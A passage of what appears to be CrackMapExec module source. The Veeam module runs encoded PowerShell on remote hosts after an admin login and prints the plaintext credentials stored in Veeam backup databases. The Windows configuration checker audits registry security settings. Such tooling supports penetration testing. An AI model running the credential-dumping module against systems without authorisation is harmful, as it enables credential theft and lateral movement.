AD, such functionality gets annoying, because\n        it generates too much output with 99% of it being false positives.\n\n        The recommended way when targeting user descriptions is to use the keyword filter to catch low-hanging fruit.\n        More dedicated searches for sensitive information should be done using the logfile.\n        This allows you to refine your search query at any time without having to pull data from AD again.\n        """"""\n        for keyword in self.keywords:\n            if keyword.lower() in description.lower():\n                return True\n        return False\n', 'veeam_dump.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Initially created by @sadshade, all output to him:\n# https://github.com/sadshade/veeam-output\n\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\nimport traceback\nfrom base64 import b64encode\nfrom cme.helpers.powershell import get_ps_script\n\n\nclass CMEModule:\n    """"""\n    Module by @NeffIsBack, @Marshall-Hallenbeck\n    """"""\n\n    name = ""veeam""\n    description = ""Extracts credentials from local Veeam SQL Database""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self):\n        with open(get_ps_script(""veeam_dump_module/veeam_dump_mssql.ps1""), ""r"") as psFile:\n            self.psScriptMssql = psFile.read()\n        with open(get_ps_script(""veeam_dump_module/veeam_dump_postgresql.ps1""), ""r"") as psFile:\n            self.psScriptPostgresql = psFile.read()\n\n    def options(self, context, module_options):\n        """"""\n        No options\n        """"""\n        pass\n\n    def checkVeeamInstalled(self, context, connection):\n        context.log.display(""Looking for Veeam installation..."")\n\n        # MsSql\n        SqlDatabase = """"\n        SqlInstance = """"\n        SqlServer = """"\n\n        # PostgreSql\n        PostgreSqlExec = """"\n        PostgresUserForWindowsAuth = """"\n        SqlDatabaseName = """"\n\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            # Veeam v12 check\n            try:\n                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SOFTWARE\\\\Veeam\\\\Veeam Backup and Replication\\\\DatabaseConfigurations"",)\n                keyHandle = ans[""phkResult""]\n\n                database_config = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlActiveConfiguration"")[1].split(""\\x00"")[:-1][0]\n\n                context.log.success(""Veeam v12 installation found!"")\n                if database_config == ""PostgreSql"":\n                    # Find the PostgreSql installation path containing ""psql.exe""\n                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SOFTWARE\\\\PostgreSQL Global Development Group\\\\PostgreSQL"",)\n                    keyHandle = ans[""phkResult""]\n                    PostgreSqlExec = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""Location"")[1].split(""\\x00"")[:-1][0] + ""\\\\bin\\\\psql.exe""\n\n                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SOFTWARE\\\\Veeam\\\\Veeam Backup and Replication\\\\DatabaseConfigurations\\\\PostgreSQL"",)\n                    keyHandle = ans[""phkResult""]\n                    PostgresUserForWindowsAuth = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""PostgresUserForWindowsAuth"")[1].split(""\\x00"")[:-1][0]\n                    SqlDatabaseName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlDatabaseName"")[1].split(""\\x00"")[:-1][0]\n                elif database_config == ""MsSql"":\n                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SOFTWARE\\\\Veeam\\\\Veeam Backup and Replication\\\\DatabaseConfigurations\\\\MsSql"",)\n                    keyHandle = ans[""phkResult""]\n\n                    SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlDatabaseName"")[1].split(""\\x00"")[:-1][0]\n                    SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlInstanceName"")[1].split(""\\x00"")[:-1][0]\n                    SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlServerName"")[1].split(""\\x00"")[:-1][0]\n            except DCERPCException as e:\n                if str(e).find(""ERROR_FILE_NOT_FOUND""):\n                    context.log.debug(""No Veeam v12 installation found"")\n            except Exception as e:\n                context.log.fail(f""UNEXPECTED ERROR: {e}"")\n                context.log.debug(traceback.format_exc())\n\n            # Veeam v11 check\n            try:\n                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SOFTWARE\\\\Veeam\\\\Veeam Backup and Replication"",)\n                keyHandle = ans[""phkResult""]\n\n                SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlDatabaseName"")[1].split(""\\x00"")[:-1][0]\n                SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlInstanceName"")[1].split(""\\x00"")[:-1][0]\n                SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""SqlServerName"")[1].split(""\\x00"")[:-1][0]\n\n                context.log.success(""Veeam v11 installation found!"")\n            except DCERPCException as e:\n                if str(e).find(""ERROR_FILE_NOT_FOUND""):\n                    context.log.debug(""No Veeam v11 installation found"")\n            except Exception as e:\n                context.log.fail(f""UNEXPECTED ERROR: {e}"")\n                context.log.debug(traceback.format_exc())\n\n        except NotImplementedError as e:\n            pass\n        except Exception as e:\n            context.log.fail(f""UNEXPECTED ERROR: {e}"")\n            context.log.debug(traceback.format_exc())\n        finally:\n            try:\n                remoteOps.finish()\n            except Exception as e:\n                context.log.debug(f""Error shutting down remote registry service: {e}"")\n\n        # Check if we found an SQL Server of some kind\n        if SqlDatabase and SqlInstance and SqlServer:\n            context.log.success(f\'Found Veeam DB ""{SqlDatabase}"" on SQL Server ""{SqlServer}\\\\{SqlInstance}""! Extracting stored credentials...\')\n            credentials = self.executePsMssql(context, connection, SqlDatabase, SqlInstance, SqlServer)\n            self.printCreds(context, credentials)\n        elif PostgreSqlExec and PostgresUserForWindowsAuth and SqlDatabaseName:\n            context.log.success(f\'Found Veeam DB ""{SqlDatabaseName}"" on an PostgreSQL Instance! Extracting stored credentials...\')\n            credentials = self.executePsPostgreSql(context, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName)\n            self.printCreds(context, credentials)\n\n    def stripXmlOutput(self, context, output):\n        return output.split(""CLIXML"")[1].split(""<Objs Version"")[0]\n    \n    def executePsMssql(self, context, connection, SqlDatabase, SqlInstance, SqlServer):\n        self.psScriptMssql = self.psScriptMssql.replace(""REPLACE_ME_SqlDatabase"", SqlDatabase)\n        self.psScriptMssql = self.psScriptMssql.replace(""REPLACE_ME_SqlInstance"", SqlInstance)\n        self.psScriptMssql = self.psScriptMssql.replace(""REPLACE_ME_SqlServer"", SqlServer)\n        psScipt_b64 = b64encode(self.psScriptMssql.encode(""UTF-16LE"")).decode(""utf-8"")\n\n        return connection.execute(""powershell.exe -e {} -OutputFormat Text"".format(psScipt_b64), True)\n\n    def executePsPostgreSql(self, context, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName):\n        self.psScriptPostgresql = self.psScriptPostgresql.replace(""REPLACE_ME_PostgreSqlExec"", PostgreSqlExec)\n        self.psScriptPostgresql = self.psScriptPostgresql.replace(""REPLACE_ME_PostgresUserForWindowsAuth"", PostgresUserForWindowsAuth)\n        self.psScriptPostgresql = self.psScriptPostgresql.replace(""REPLACE_ME_SqlDatabaseName"", SqlDatabaseName)\n        psScipt_b64 = b64encode(self.psScriptPostgresql.encode(""UTF-16LE"")).decode(""utf-8"")\n\n        return connection.execute(""powershell.exe -e {} -OutputFormat Text"".format(psScipt_b64), True)\n\n    def printCreds(self, context, output):\n        # Format ouput if returned in some XML Format\n        if ""CLIXML"" in output:\n            output = self.stripXmlOutput(context, output)\n\n        if ""Access denied"" in output:\n            context.log.fail(""Access denied! This is probably due to an AntiVirus software blocking the execution of the PowerShell script."")\n\n        # Stripping whitespaces and newlines\n        output_stripped = ["" "".join(line.split()) for line in output.split(""\\r\\n"") if line.strip()]\n\n        # Error handling\n        if ""Can\'t connect to DB! Exiting..."" in output_stripped or ""No passwords found!"" in output_stripped:\n            context.log.fail(output_stripped[0])\n            return\n\n        for account in output_stripped:\n            user, password = account.split("" "", 1)\n            password = password.replace(""WHITESPACE_ERROR"", "" "")\n            context.log.highlight(user + "":"" + f""{password}"")\n            if \' \' in password:\n                context.log.fail(f""Password contains whitespaces! The password for user \\""{user}\\"" is: \\""{password}\\"""")\n\n    def on_admin_login(self, context, connection):\n        self.checkVeeamInstalled(context, connection)\n', 'wcc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport json\nimport logging\nimport operator\nimport sys\nimport time\nfrom termcolor import colored\n\nfrom cme.logger import cme_logger\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5 import rrp, samr, scmr\nfrom impacket.dcerpc.v5.rrp import DCERPCSessionError\nfrom impacket.smbconnection import SessionError as SMBSessionError\nfrom impacket.examples.secretsdump import RemoteOperations\nfrom impacket.system_errors import *\n\n# Configuration variables\nOUTDATED_THRESHOLD = 30\nDEFAULT_OUTPUT_FILE = \'./wcc_results.json\'\nDEFAULT_OUTPUT_FORMAT = \'json\'\nVALID_OUTPUT_FORMATS = [\'json\', \'csv\']\n\n# Registry value types\nREG_VALUE_TYPE_UNDEFINED = 0\nREG_VALUE_TYPE_UNICODE_STRING = 1\nREG_VALUE_TYPE_UNICODE_STRING_WITH_ENV = 2\nREG_VALUE_TYPE_BINARY = 3\nREG_VALUE_TYPE_32BIT_LE = 4\nREG_VALUE_TYPE_32BIT_BE = 5\nREG_VALUE_TYPE_UNICODE_STRING_SEQUENCE = 7\nREG_VALUE_TYPE_64BIT_LE = 11\n\n# Setup file logger\nif \'wcc_logger\' not in globals():\n    wcc_logger = logging.getLogger(\'WCC\')\n    wcc_logger.propagate = False\n    log_filename = cme_logger.init_log_file()\n    log_filename = log_filename.replace(\'log_\', \'wcc_\')\n    wcc_logger.setLevel(logging.INFO)\n    wcc_file_handler = logging.FileHandler(log_filename)\n    wcc_file_handler.setFormatter(logging.Formatter(\'%(asctime)s [%(levelname)s] %(message)s\'))\n    wcc_logger.addHandler(wcc_file_handler)\n\nclass ConfigCheck:\n    """"""\n    Class for performing the checks and holding the results\n    """"""\n\n    module = None\n\n    def __init__(self, name, description="""", checkers=[None], checker_args=[[]], checker_kwargs=[{}]):\n        self.check_id = None\n        self.name = name\n        self.description = description\n        assert len(checkers) == len(checker_args) and len(checkers) == len(checker_kwargs)\n        self.checkers = checkers\n        self.checker_args = checker_args\n        self.checker_kwargs = checker_kwargs\n        self.ok = True\n        self.reasons = []\n\n    def run(self):\n        for checker, args, kwargs in zip(self.checkers, self.checker_args, self.checker_kwargs):\n            if checker is None:\n                checker = HostChecker.check_registry\n\n            ok, reasons = checker(*args, **kwargs)\n            self.ok = self.ok and ok\n            self.reasons.extend(reasons)\n\n    def log(self, context):\n        result = \'passed\' if self.ok else \'did not pass\'\n        reasons = \', \'.join(self.reasons)\n        wcc_logger.info(f\'{self.connection.host}: Check ""{self.name}"" {result} because: {reasons}\')\n        if self.module.quiet:\n            return\n\n        status = colored(\'OK\', \'green\', attrs=[\'bold\']) if self.ok else colored(\'KO\', \'red\', attrs=[\'bold\'])\n        reasons = "": "" + \', \'.join(self.reasons)\n        msg = f\'{status} {self.name}\'\n        info_msg = f\'{status} {self.name}{reasons}\'\n        context.log.highlight(msg)\n        context.log.info(info_msg)\n\nclass CMEModule:\n    \'\'\'\n    Windows Configuration Checker\n\n    Module author: @__fpr (Orange Cyberdefense)\n    \'\'\'\n    name = \'wcc\'\n    description = \'Check various security configuration items on Windows machines\'\n    supported_protocols = [\'smb\']\n    opsec_safe= True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        \'\'\'\n        OUTPUT_FORMAT   Format for report (Default: \'json\')\n        OUTPUT          Path for report\n        QUIET           Do not print results to stdout (Default: False)\n        \'\'\'\n        self.output = module_options.get(\'OUTPUT\')\n        self.output_format = module_options.get(\'OUTPUT_FORMAT\', DEFAULT_OUTPUT_FORMAT)\n        if self.output_format not in VALID_OUTPUT_FORMATS:\n            self.output_format = DEFAULT_OUTPUT_FORMAT\n        self.quiet = module_options.get(\'QUIET\', \'false\').lower() in (\'true\', \'1\')\n\n        self.results = {}\n        ConfigCheck.module = self\n        HostChecker.module = self\n\n    def on_admin_login(self, context, connection):\n        self.results.setdefault(connection.host, {\'checks\':[]})\n        self.context = context\n        HostChecker(context, connection).run()\n\n    def on_shutdown(self, context, connection):\n        if self.output is not None:\n            self.export_results()\n\n    def add_result(self, host, result):\n        self.results[host][\'checks\'].append({\n            ""Check"":result.name,\n            ""Description"":result.description,\n            ""Status"":\'OK\' if result.ok else \'KO\',\n            ""Reasons"":result.reasons\n        })\n\n    def export_results(self):\n        with open(self.output, \'w\') as output:\n            if self.output_format == \'json\':\n                json.dump(self.results, output)\n            elif self.output_format == \'csv\':\n                output.write(\'Host,Check,Description,Status,Reasons\')\n                for host in self.results:\n                    for result in self.results[host][\'checks\']:\n                        output.write(f\'\\n{host}\')\n                        for field in (result[\'Check\'], result[\'Description\'], result[\'Status\'], \' ; \'.join(result[\'Reasons\']).replace(\'\\x00\',\'\')):\n                            if \',\' in field:\n                                field = field.replace(\'""\', \'""""\')\n                                field = f\'""{field}""\'\n                            output.write(f\',{field}\')\n        self.context.log.success(f\'Results written to {self.output}\')\n\nclass HostChecker:\n    module = None\n\n    def __init__(self, context, connection):\n        self.context = context\n        self.connection = connection\n        remoteOps = RemoteOperations(smbConnection=connection.conn, doKerberos=False)\n        remoteOps.enableRegistry()\n        self.dce = remoteOps._RemoteOperations__rrp\n\n    def run(self):\n        # Prepare checks\n        self.init_checks()\n\n        # Perform checks\n        self.check_config()\n\n    # Check methods #\n    #################\n\n    def init_checks(self):\n        # Declare the checks to do and how to do them\n        self.checks = [\n            ConfigCheck(\'Last successful update\', \'Checks how old is the last successful update\', checkers=[self.check_last_successful_update]),\n            ConfigCheck(\'LAPS\', \'Checks if LAPS is installed\', checkers=[self.check_laps]),\n            ConfigCheck(""Administrator\'s name"", \'Checks if Administror user name has been changed\', checkers=[self.check_administrator_name]),\n            ConfigCheck(\'UAC configuration\', \'Checks if UAC configuration is secure\', checker_args=[[\n                self,\n                (\n                    \'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\',\n                    \'EnableLUA\', 1\n                ),(\n                    \'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\',\n                    \'LocalAccountTokenFilterPolicy\', 0\n                )]]),\n            ConfigCheck(\'Hash storage format\', \'Checks if storing  hashes in LM format is disabled\', checker_args=[[self, (\n                    \'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\',\n                    \'NoLMHash\', 1\n                )]]),\n            ConfigCheck(\'Always install elevated\', \'Checks if AlwaysInstallElevated is disabled\', checker_args=[[self, (\n                    \'HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer\',\n                    \'AlwaysInstallElevated\', 0\n                )\n            ]]),\n            ConfigCheck(\'IPv6 preference\', \'Checks if IPv6 is preferred over IPv4\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip6\\\\Parameters\',\n                    \'DisabledComponents\', (32, 255), in_\n                )\n            ]]),\n            ConfigCheck(\'Spooler service\', \'Checks if the spooler service is disabled\', checkers=[self.check_spooler_service]),\n            ConfigCheck(\'WDigest authentication\', \'Checks if WDigest authentication is disabled\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest\',\n                    \'UseLogonCredential\', 0\n                )\n            ]]),\n            ConfigCheck(\'WSUS configuration\', \'Checks if WSUS configuration uses HTTPS\', checkers=[self.check_wsus_running, None], checker_args=[[], [self, (\n                        \'HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\',\n                        \'WUServer\', \'https://\', startswith\n                    ),(\n                        \'HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\',\n                        \'UseWUServer\', 0, operator.eq\n                    )]], checker_kwargs=[{},{\'options\':{\'lastWins\':True}}]),\n            ConfigCheck(\'LSA cache\', \'Checks how many logons are kept in the LSA cache\', checker_args=[[self, (\n                    \'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\',\n                    \'CachedLogonsCount\', 2, le\n                )\n            ]]),\n            ConfigCheck(\'AppLocker\', \'Checks if there are AppLocker rules defined\', checkers=[self.check_applocker]),\n            ConfigCheck(\'RDP expiration time\', \'Checks RDP session timeout\', checker_args=[[self, (\n                    \'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\',\n                    \'MaxDisconnectionTime\', 0, operator.gt\n                ),(\n                    \'HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\',\n                    \'MaxDisconnectionTime\', 0, operator.gt\n                )\n            ]]),\n            ConfigCheck(\'CredentialGuard\', \'Checks if CredentialGuard is enabled\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceGuard\',\n                    \'EnableVirtualizationBasedSecurity\', 1\n                ),(\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\',\n                    \'LsaCfgFlags\', 1\n                )\n            ]]),\n            ConfigCheck(\'PPL\', \'Checks if lsass runs as a protected process\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\',\n                    \'RunAsPPL\', 1\n                )\n            ]]),\n            ConfigCheck(\'Powershell v2 availability\', \'Checks if powershell v2 is available\', checker_args=[[self, (\n                    \'HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\3\\\\PowerShellEngine\',\n                    \'PSCompatibleVersion\', \'2.0\', not_(operator.contains)\n                )\n            ]]),\n            ConfigCheck(\'LmCompatibilityLevel\', \'Checks if LmCompatibilityLevel is set to 5\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\',\n                    \'LmCompatibilityLevel\', 5, operator.ge\n                )\n            ]]),\n            ConfigCheck(\'NBTNS\', \'Checks if NBTNS is disabled on all interfaces\', checkers=[self.check_nbtns]),\n            ConfigCheck(\'mDNS\', \'Checks if mDNS is disabled\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\DNScache\\\\Parameters\',\n                    \'EnableMDNS\', 0\n                )\n            ]]),\n            ConfigCheck(\'SMB signing\', \'Checks if SMB signing is enabled\', checker_args=[[self, (\n                    \'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\',\n                    \'requiresecuritysignature\', 1\n                )\n            ]]),\n            ConfigCheck(\'LDAP signing\', \'Checks if LDAP signing is enabled\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NTDS\\\\Parameters\',\n                    \'LDAPServerIntegrity\', 2\n                ),(\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NTDS\',\n                    \'LdapEnforceChannelBinding\', 2\n                )\n            ]]),\n            ConfigCheck(\'SMB encryption\', \'Checks if SMB encryption is enabled\', checker_args=[[self, (\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\',\n                    \'EncryptData\', 1\n                )\n            ]]),\n            ConfigCheck(\'RDP authentication\', \'Checks RDP authentication configuration (NLA auth and restricted admin mode)\', checker_args=[[self, (\n                    \'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\\',\n                    \'UserAuthentication\', 1\n                ),(\n                    \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\LSA\',\n                    \'RestrictedAdminMode\', 1\n                )\n            ]]),\n            ConfigCheck(\'BitLocker configuration\', \'Checks the BitLocker configuration (based on https://www.stigviewer.com/stig/windows_10/2020-06-15/finding/V-94859)\', checker_args=[[self, (\n                    \'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE\',\n                    \'UseAdvancedStartup\', 1\n                ),(\n                    \'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE\',\n                    \'UseTPMPIN\', 1\n                )\n            ]]),\n            ConfigCheck(\'Guest account disabled\', \'Checks if the guest account is disabled\', checkers=[self.check_guest_account_disabled]),\n            ConfigCheck(\'Automatic session lock\', \'Checks if the session is automatically locked on after a period of inactivity\', checker_args=[[self, (\n                    \'HKCU\\\\Control Panel\\\\Desktop\',\n                    \'ScreenSaverIsSecure\', 1\n                ),(\n                    \'HKCU\\\\Control Panel\\\\Desktop\',\n                    \'ScreenSaveTimeOut\', 300, le\n                )\n            ]]),\n            ConfigCheck(\'Powershell Execution Policy\', \'Checks if the Powershell execution policy is set to ""Restricted""\', checker_args=[[self, (\n                    \'HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\ShellIds\\Microsoft.Powershell\',\n                    \'ExecutionPolicy\', \'Restricted\\x00\'\n                ),(\n                    \'HKCU\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\ShellIds\\Microsoft.Powershell\',\n                    \'ExecutionPolicy\', \'Restricted\\x00\'\n                )\n            ]], checker_kwargs=[{\'options\':{\'KOIfMissing\':False, \'lastWins\':True}}])\n        ]\n\n        # Add check to conf_checks table if missing\n        db_checks = self.connection.db.get_checks()\n        db_check_names = [ check._asdict()[\'name\'].strip().lower() for check in db_checks ]\n        added = []\n        for i,check in enumerate(self.checks):\n            check.connection = self.connection\n            missing = True\n            for db_check in db_checks:\n                db_check = db_check._asdict()\n                if check.name.strip().lower() == db_check[\'name\'].strip().lower():\n                    missing = False\n                    self.checks[i].check_id = db_check[\'id\']\n                    break\n\n            if missing:\n                self.connection.db.add_check(check.name, check.description)\n                added.append(check)\n\n        # Update check_id for checks added to the db\n        db_checks = self.connection.db.get_checks()\n        for i,check in enumerate(added):\n            check_id = None\n            for db_check in db_checks:\n                db_check = db_check._asdict()\n                if db_check[\'name\'].strip().lower() == check.name.strip().lower():\n                    check_id = db_check[\'id\']\n                    break\n            added[i].check_id = check_id\n\n    def check_config(self):\n        # Get host ID from db\n        host_id = None\n        hosts = self.connection.db.get_hosts(self.connection.host)\n        for host in hosts:\n            host = host._asdict()\n            if host[\'ip\'] == self.connection.host and host[\'hostname\'] == self.connection.hostname and host[\'domain\'] == self.connection.domain:\n                host_id = host[\'id\']\n                break\n\n        # Perform all the checks and store the results\n        for check in self.checks:\n            try:\n                check.run()\n            except Exception as e:\n                self.context.log.error(f\'HostChecker.check_config(): Error while performing check {check.name}: {e}\')\n            check.log(self.context)\n            self.module.add_result(self.connection.host, check)\n            if host_id is not None:\n                self.connection.db.add_check_result(host_id, check.check_id, check.ok, \', \'.join(check.reasons).replace(\'\\x00\',\'\'))\n\n    def check_registry(self, *specs, options={}):\n        """"""\n        Perform checks that only require to compare values in the registry with expected values, according to the specs\n        a spec may be either a 3-tuple: (key name, value name, expected value), or a 4-tuple (key name, value name, expected value, operation), where operation is a function that implements a comparison operator\n        """"""\n        default_options = {\n            \'lastWins\':False,\n            \'stopOnOK\':False,\n            \'stopOnKO\':False,\n            \'KOIfMissing\':True\n        }\n        default_options.update(options)\n        options = default_options\n        op = operator.eq\n        ok = True\n        reasons = []\n\n        for spec in specs:\n            try:\n                if len(spec) == 3:\n                    (key, value_name, expected_value) = spec\n                elif len(spec) == 4:\n                    (key, value_name, expected_value, op) = spec\n                else:\n                    ok = False\n                    reasons = [\'Check could not be performed (invalid specification provided)\']\n                    return ok, reasons\n            except Exception as e:\n                self.module.log.error(f\'Check could not be performed. Details: specs={specs}, dce={self.dce}, error: {e}\')\n                return ok, reasons\n\n            if op == operator.eq:\n                opstring = \'{left} == {right}\'\n                nopstring = \'{left} != {right}\'\n            elif op == operator.contains:\n                opstring = \'{left} in {right}\'\n                nopstring = \'{left} not in {right}\'\n            elif op == operator.gt:\n                opstring = \'{left} > {right}\'\n                nopstring = \'{left} <= {right}\'\n            elif op == operator.ge:\n                opstring = \'{left} >= {right}\'\n                nopstring = \'{left} < {right}\'\n            elif op == operator.lt:\n                opstring = \'{left} < {right}\'\n                nopstring = \'{left} >= {right}\'\n            elif op == operator.le:\n                opstring = \'{left} <= {right}\'\n                nopstring = \'{left} > {right}\'\n            elif op == operator.ne:\n                opstring = \'{left} != {right}\'\n                nopstring = \'{left} == {right}\'\n            else:\n                opstring = f\'{op.__name__}({{left}}, {{right}}) == True\'\n                nopstring = f\'{op.__name__}({{left}}, {{right}}) == True\'\n\n            value = self.reg_query_value(self.dce, self.connection, key, value_name)\n\n            if type(value) == DCERPCSessionError:\n                if options[\'KOIfMissing\']:\n                    ok = False\n                if value.error_code in (ERROR_NO_MORE_ITEMS, ERROR_FILE_NOT_FOUND):\n                    reasons.append(f\'{key}: Key not found\')\n                elif value.error_code == ERROR_OBJECT_NOT_FOUND:\n                    reasons.append(f\'{value_name}: Value not found\')\n                else:\n                    ok = False\n                    reasons.append(f\'Error while retrieving value of {key}\\\\{value_name}: {value}\')\n                continue\n\n            if op(value, expected_value):\n                if options[\'lastWins\']:\n                    ok = True\n                reasons.append(opstring.format(left=f\'{key}\\\\{value_name} ({value})\', right=expected_value))\n            else:\n                reasons.append(nopstring.format(left=f\'{key}\\\\{value_name} ({value})\', right=expected_value))\n                ok = False\n            if ok and options[\'stopOnOK\']:\n                break\n            if not ok and options[\'stopOnKO\']:\n                break\n\n        return ok, reasons\n\n    def check_laps(self):\n        reasons = []\n        success = False\n        lapsv2_ad_key_name = \'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\LAPS\'\n        lapsv2_aad_key_name = \'Software\\\\Microsoft\\\\Policies\\\\LAPS\'\n\n        # Checking LAPSv2\n        ans = self._open_root_key(self.dce, self.connection, \'HKLM\')\n\n        if ans is None:\n            return False, [\'Could not query remote registry\']\n\n        root_key_handle = ans[\'phKey\']\n        try:\n            ans = rrp.hBaseRegOpenKey(self.dce, root_key_handle, lapsv2_ad_key_name)\n            reasons.append(f""HKLM\\\\{lapsv2_ad_key_name} found, LAPSv2 AD installed"")\n            success = True\n            return success, reasons\n        except DCERPCSessionError as e:\n            if e.error_code != ERROR_FILE_NOT_FOUND:\n                reasons.append(f""HKLM\\\\{lapsv2_ad_key_name} not found"")\n\n        try:\n            ans = rrp.hBaseRegOpenKey(self.dce, root_key_handle, lapsv2_aad_key_name)\n            reasons.append(f""HKLM\\\\{lapsv2_aad_key_name} found, LAPSv2 AAD installed"")\n            success = True\n            return success, reasons\n        except DCERPCSessionError as e:\n            if e.error_code != ERROR_FILE_NOT_FOUND:\n                reasons.append(f""HKLM\\\\{lapsv2_aad_key_name} not found"")\n\n        # LAPSv2 does not seems to be installed, checking LAPSv1\n        lapsv1_key_name = \'HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\GPextensions\'\n        subkeys =  self.reg_get_subkeys(self.dce, self.connection, lapsv1_key_name)\n        laps_path = \'\\\\Program Files\\\\LAPS\\\\CSE\'\n\n        for subkey in subkeys:\n            value = self.reg_query_value(self.dce, self.connection, lapsv1_key_name + \'\\\\\' + subkey, \'DllName\')\n            if type(value) == str and \'laps\\\\cse\\\\admpwd.dll\' in value.lower():\n                reasons.append(f\'{lapsv1_key_name}\\\\...\\\\DllName matches AdmPwd.dll\')\n                success = True\n                laps_path = \'\\\\\'.join(value.split(\'\\\\\')[1:-1])\n                break\n        if not success:\n            reasons.append(f\'No match found in {lapsv1_key_name}\\\\...\\\\DllName\')\n\n        l = self.ls(self.connection, laps_path)\n        if l:\n            reasons.append(\'Found LAPS folder at \' + laps_path)\n        else:\n            success = False\n            reasons.append(\'LAPS folder does not exist\')\n            return success, reasons\n\n\n        l = self.ls(self.connection, laps_path + \'\\\\AdmPwd.dll\')\n        if l:\n            reasons.append(f\'Found {laps_path}\\\\AdmPwd.dll\')\n        else:\n            success = False\n            reasons.append(f\'{laps_path}\\\\AdmPwd.dll not found\')\n\n        return success, reasons\n\n    def check_last_successful_update(self):\n        records = self.connection.wmi(wmi_query=\'Select TimeGenerated FROM Win32_ReliabilityRecords Where EventIdentifier=19\', namespace=\'root\\\\cimv2\')\n        if isinstance(records, bool) or len(records) == 0:\n            return False, [\'No update found\']\n        most_recent_update_date = records[0][\'TimeGenerated\'][\'value\']\n        most_recent_update_date = most_recent_update_date.split(\'.\')[0]\n        most_recent_update_date = time.strptime(most_recent_update_date, \'%Y%m%d%H%M%S\')\n        most_recent_update_date = time.mktime(most_recent_update_date)\n        now = time.time()\n        days_since_last_update = (now - most_recent_update_date)//86400\n        if days_since_last_update <= OUTDATED_THRESHOLD:\n            return True, [f\'Last update was {days_since_last_update} <= {OUTDATED_THRESHOLD} days ago\']\n        else:\n            return False, [f\'Last update was {days_since_last_update} > {OUTDATED_THRESHOLD} days ago\']\n\n    def check_administrator_name(self):\n        user_info = self.get_user_info(self.connection, rid=500)\n  